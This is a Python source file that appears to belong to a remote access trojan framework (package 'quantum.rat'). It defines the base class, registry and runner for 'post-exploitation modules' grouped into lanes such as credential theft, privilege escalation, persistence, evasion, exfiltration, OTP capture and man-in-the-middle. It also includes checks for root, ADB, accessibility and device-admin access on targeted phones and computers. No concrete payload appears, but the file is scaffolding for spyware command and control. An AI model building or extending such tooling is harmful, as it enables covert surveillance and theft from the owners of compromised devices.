"""Post-exploitation module base class and registry."""

from __future__ import annotations

import importlib
import pkgutil
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Callable

from quantum.core.bus import BUS, publish_task_event
from quantum.rat.tasks import Task, TaskState, get_task, queue_task


@dataclass
class ModuleResult:
    """Result of a module execution."""
    ok: bool
    raw: str = ""
    parsed: Dict[str, Any] = field(default_factory=dict)
    artifacts: List[Dict[str, Any]] = field(default_factory=list)
    error: str = ""
    next_actions: List[Dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "ok": self.ok,
            "raw": self.raw,
            "parsed": self.parsed,
            "artifacts": self.artifacts,
            "error": self.error,
            "next_actions": self.next_actions,
        }


class Module(ABC):
    """Base class for all post-exploitation modules."""

    # Module metadata (override in subclasses)
    name: str = ""                    # snake_case, unique identifier
    lane: str = "CUSTOM"              # CREDS|CRYPTO|PRIVESC|PERSIST|EVASION|NET|RADIO|EXFIL|CONTROL|ACCOUNT|OTP|MITM|ABUSE|FORENSIC
    platforms: tuple = ("linux", "windows", "macos", "android", "ios")
    requires: str = "stock"           # stock|shell|root|a11y|admin|network|hardware
    destructive: bool = False
    reversible: bool = False
    args: Dict[str, Dict[str, Any]] = {}  # {name: {"type":..,"default":..,"help":..,"required":..}}
    timeout_s: int = 120
    description: str = ""

    def __init__(self):
        if not self.name:
            raise ValueError("Module must have a name")
        if self.lane not in MODULE_LANES:
            raise ValueError(f"Invalid lane: {self.lane}")

    @abstractmethod
    def build(self, args: Dict[str, Any]) -> str:
        """Build the command to execute.
        
        Returns:
            Shell command / ADB command / WebSocket message to send to agent
        """
        pass

    @abstractmethod
    def parse(self, raw: str, args: Dict[str, Any]) -> ModuleResult:
        """Parse raw output into structured result.
        
        Args:
            raw: Raw output from command execution
            args: Arguments passed to the module
            
        Returns:
            ModuleResult with parsed data
        """
        pass

    def verify(self) -> bool:
        """Verify module can run (dependencies, permissions, etc.).
        
        Returns:
            True if module is verified and can run
        """
        return True

    def rollback(self, args: Dict[str, Any], result: ModuleResult) -> Optional[str]:
        """Generate rollback command for reversible modules.
        
        Returns:
            Command to undo the module's effects, or None if not reversible
        """
        return None

    def pre_run(self, device_id: str, args: Dict[str, Any]) -> bool:
        """Pre-run checks. Return False to abort."""
        return True

    def post_run(self, device_id: str, args: Dict[str, Any], result: ModuleResult) -> None:
        """Post-run cleanup/actions."""
        pass


# Valid lanes
MODULE_LANES = {
    "CREDS", "CRYPTO", "PRIVESC", "PERSIST", "EVASION",
    "NET", "RADIO", "EXFIL", "CONTROL", "ACCOUNT",
    "OTP", "MITM", "ABUSE", "FORENSIC", "CUSTOM",
}


# Module registry
MODULES: Dict[str, Module] = {}
_MODULE_INSTANCES: Dict[str, Module] = {}


def register(module: Module) -> None:
    """Register a module."""
    if module.name in MODULES:
        raise ValueError(f"Module {module.name} already registered")
    MODULES[module.name] = module
    _MODULE_INSTANCES[module.name] = module


def get_module(name: str) -> Optional[Module]:
    """Get a module by name."""
    return MODULES.get(name)


def get_modules(lane: Optional[str] = None, platform: Optional[str] = None) -> List[Module]:
    """Get all modules, optionally filtered."""
    modules = list(MODULES.values())
    if lane:
        modules = [m for m in modules if m.lane == lane]
    if platform:
        modules = [m for m in modules if platform in m.platforms]
    return modules


def get_modules_by_lane() -> Dict[str, List[Module]]:
    """Get modules grouped by lane."""
    result = {}
    for module in MODULES.values():
        if module.lane not in result:
            result[module.lane] = []
        result[module.lane].append(module)
    return result


def load_all_modules() -> Dict[str, Module]:
    """Auto-discover and load all modules from rat/modules/."""
    # Import the modules package
    from quantum.rat import modules
    
    for _, name, _ in pkgutil.iter_modules(modules.__path__):
        if name.startswith("_") or name == "base":
            continue
        try:
            importlib.import_module(f"quantum.rat.modules.{name}")
        except Exception as e:
            print(f"[modules] Failed to load {name}: {e}")
    
    return MODULES


def run_module(device_id: str, module_name: str, args: Dict[str, Any], dry_run: bool = False) -> ModuleResult:
    """Run a module on a device."""
    module = get_module(module_name)
    if not module:
        return ModuleResult(ok=False, error=f"Module {module_name} not found")

    # Check platform compatibility
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    if device and device.platform not in module.platforms:
        return ModuleResult(ok=False, error=f"Module {module_name} not compatible with {device.platform}")

    # Verify module
    if not module.verify():
        return ModuleResult(ok=False, error=f"Module {module_name} verification failed")

    # Build command
    cmd = module.build(args)

    if dry_run:
        return ModuleResult(
            ok=True,
            raw=f"[DRY RUN] {cmd}",
            parsed={"command": cmd, "module": module_name, "args": args},
        )

    # Queue as task for async execution
    task_id = queue_task(device_id, module_name, args, dry_run=False)
    
    # For now, return immediately with task_id
    # Real execution happens in worker thread
    return ModuleResult(
        ok=True,
        raw=f"Task queued: {task_id}",
        parsed={"task_id": task_id, "command": cmd, "module": module_name, "args": args},
        next_actions=[{"module": "wait_for_task", "args": {"task_id": task_id}}]
    )


def execute_module_sync(device_id: str, module_name: str, args: Dict[str, Any]) -> ModuleResult:
    """Execute a module synchronously (for testing/dry-run)."""
    module = get_module(module_name)
    if not module:
        return ModuleResult(ok=False, error=f"Module {module_name} not found")

    # Build command
    cmd = module.build(args)

    # In real implementation, this would send to agent and wait for result
    # For now, return dry-run style result
    return ModuleResult(
        ok=True,
        raw=f"[SYNC EXEC] {cmd}",
        parsed={"command": cmd, "module": module_name, "args": args},
    )


# Helper functions for module authors

def require_root(device_id: str) -> bool:
    """Check if device has root."""
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    return device and device.capabilities.has_root


def require_adb(device_id: str) -> bool:
    """Check if device has ADB enabled."""
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    return device and device.capabilities.adb_enabled


def require_a11y(device_id: str) -> bool:
    """Check if device has accessibility service."""
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    return device and device.capabilities.notification_listener


def require_admin(device_id: str) -> bool:
    """Check if device has device admin."""
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    return device and bool(device.capabilities.device_admin_apps)


def require_network(device_id: str) -> bool:
    """Check if device has network access."""
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    return device and bool(device.ip_local)


def require_hardware(device_id: str, hardware: str) -> bool:
    """Check if device has specific hardware."""
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    if not device:
        return False
    caps = device.capabilities
    hardware_map = {
        "bluetooth": caps.bluetooth,
        "nfc": caps.nfc,
        "usb_otg": caps.usb_otg,
        "hdmi": caps.hdmi_out,
        "gps": caps.gps,
        "fingerprint": caps.fingerprint,
        "face_id": caps.face_id,
    }
    return hardware_map.get(hardware, False)


def get_device_platform(device_id: str) -> Optional[str]:
    """Get device platform."""
    from quantum.rat.registry import get_device
    device = get_device(device_id)
    return device.platform if device else None


# Module argument helpers

def arg_string(name: str, default: str = "", help: str = "", required: bool = False) -> Dict[str, Any]:
    """String argument definition."""
    return {"type": "string", "default": default, "help": help, "required": required}


def arg_int(name: str, default: int = 0, help: str = "", required: bool = False) -> Dict[str, Any]:
    """Integer argument definition."""
    return {"type": "integer", "default": default, "help": help, "required": required}


def arg_float(name: str, default: float = 0.0, help: str = "", required: bool = False) -> Dict[str, Any]:
    """Float argument definition."""
    return {"type": "number", "default": default, "help": help, "required": required}


def arg_bool(name: str, default: bool = False, help: str = "", required: bool = False) -> Dict[str, Any]:
    """Boolean argument definition."""
    return {"type": "boolean", "default": default, "help": help, "required": required}


def arg_list(name: str, default: List = None, help: str = "", required: bool = False) -> Dict[str, Any]:
    """List argument definition."""
    return {"type": "array", "default": default or [], "help": help, "required": required}


def arg_enum(name: str, choices: List[str], default: str = "", help: str = "", required: bool = False) -> Dict[str, Any]:
    """Enum argument definition."""
    return {"type": "string", "enum": choices, "default": default, "help": help, "required": required}


def arg_file(name: str, help: str = "", required: bool = False) -> Dict[str, Any]:
    """File path argument definition."""
    return {"type": "file", "help": help, "required": required}


# Module metadata for API/UI

def get_module_catalog() -> List[Dict[str, Any]]:
    """Get module catalog for API/UI."""
    catalog = []
    for module in MODULES.values():
        catalog.append({
            "name": module.name,
            "lane": module.lane,
            "platforms": list(module.platforms),
            "requires": module.requires,
            "destructive": module.destructive,
            "reversible": module.reversible,
            "args": module.args,
            "timeout_s": module.timeout_s,
            "description": module.description,
        })
    return catalog


def validate_module(module: Module) -> List[str]:
    """Validate a module definition. Returns list of errors."""
    errors = []

    if not module.name:
        errors.append("Module name is required")
    elif not module.name.islower() or " " in module.name:
        errors.append("Module name must be lowercase snake_case")

    if module.lane not in MODULE_LANES:
        errors.append(f"Invalid lane: {module.lane}")

    if module.requires not in {"stock", "shell", "root", "a11y", "admin", "network", "hardware"}:
        errors.append(f"Invalid requires: {module.requires}")

    for arg_name, arg_def in module.args.items():
        if "type" not in arg_def:
            errors.append(f"Argument {arg_name} missing type")
        if "help" not in arg_def:
            errors.append(f"Argument {arg_name} missing help")

    return errors